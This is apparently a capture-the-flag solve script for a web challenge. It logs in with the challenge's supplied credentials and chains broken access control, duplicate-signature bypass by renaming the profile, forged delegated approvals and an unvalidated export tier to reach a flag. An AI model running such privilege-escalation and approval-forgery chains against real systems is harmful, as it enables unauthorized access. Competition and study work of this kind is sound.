#!/usr/bin/env python3
"""Cyberboy (CSCTF 2026, web, 900) - Relay Desk privilege walk.

Chain (all as the plain analyst a.reyes):
  1. PATCH /api/profile {"duty_assignment": "KL-01"} + POST /api/profile/refresh
     -> the session scope is rebuilt from a *client-controlled* profile field,
        so the analyst is now scoped to the theatre relay authority (KL-01).
  2. GET /api/rotations now lists KL-01 rotations *with valid signed refs*
     (the ref MAC is only checked on write endpoints, not on reads).
  3. Two sign-offs on one rotation, both performed by us:
       - POST /approve records the approval under our own profile display_name,
         and the duplicate check is on that *name*, so renaming the profile
         between the two calls lets one account sign twice;
       - alternatively POST /delegate-approval {"delegate_id": ...} records an
         approval against any account id we name.
  4. POST /export {"tier": "master"} - the tier is taken from the request body
     and never checked against the rotation's authorized_tier ("theater"),
     so the bundle seals at master custody and carries the flag.

Usage: python3 solve.py http://host:port
"""
import json
import sys
import urllib.error
import urllib.request
from http.cookiejar import CookieJar

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://w06.ctf.chronos-security.ro:33097").rstrip("/")
USER, PASSWD = "a.reyes", "relay-bramble-27"
TARGET_UNIT = "KL-01"          # Kestrel Lead - Theatre Relay Authority
MASTER_TIER = "master"

opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(CookieJar()))


def call(method, path, body=None):
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(BASE + path, data=data, method=method,
                                 headers={"Content-Type": "application/json"})
    try:
        with opener.open(req, timeout=20) as r:
            return json.loads(r.read() or b"{}")
    except urllib.error.HTTPError as e:
        return json.loads(e.read() or b"{}")


# 1. ordinary analyst login
sess = call("POST", "/api/session", {"username": USER, "password": PASSWD})
print(f"[+] logged in as {sess['account_id']}, scope {sess['scope']}")

# 2. broken access control: the session scope comes from a profile field we own
call("PATCH", "/api/profile", {"duty_assignment": TARGET_UNIT})
sess = call("POST", "/api/profile/refresh")
assert sess.get("scope") == TARGET_UNIT, sess
print(f"[+] scope escalated to {sess['scope']}")

# 3. pick a rotation of the authority that is not sealed yet, and its signed ref
rots = call("GET", "/api/rotations")["rotations"]
rot = next((r for r in rots if r["status"] == "approved"), None) \
    or next(r for r in rots if r["status"] in ("pending", "draft"))
ref = rot["ref"]
print(f"[+] target rotation {rot['crypto_period']} ({rot['status']}, "
      f"authorized_tier={rot['authorized_tier']})")

# 4. collect the two sign-offs ourselves
staff = call("GET", f"/api/units/{TARGET_UNIT}/staff")["staff"]
while rot["status"] != "approved":
    for officer in staff:
        # the duplicate-signature check is on the display name, so just rename
        call("PATCH", "/api/profile", {"display_name": officer["display_name"]})
        r = call("POST", f"/api/rotations/{ref}/approve")
        print(f"    approve as {officer['display_name']}: "
              f"{r.get('rotation', {}).get('status', r)}")
        rot = call("GET", f"/api/rotations/{ref}")["rotation"]
        if rot["status"] == "approved":
            break
    else:
        # fallback: delegated slots against other account ids
        for officer in staff:
            call("POST", f"/api/rotations/{ref}/delegate-approval",
                 {"delegate_id": officer["account_id"]})
        rot = call("GET", f"/api/rotations/{ref}")["rotation"]
        if rot["status"] != "approved":
            sys.exit(f"[-] could not reach approved state: {rot}")
print(f"[+] rotation approved with {len(rot['approvals'])} signatures")

# 5. the export tier is unvalidated -> seal at master custody
out = call("POST", f"/api/rotations/{ref}/export", {"tier": MASTER_TIER})
bundle = out.get("bundle") or sys.exit(f"[-] export failed: {out}")
print(f"[+] bundle {bundle['bundle_id']} tier={bundle['tier']} "
      f"custody={bundle['custody']}")
print("FLAG:", bundle["authorization_code"])
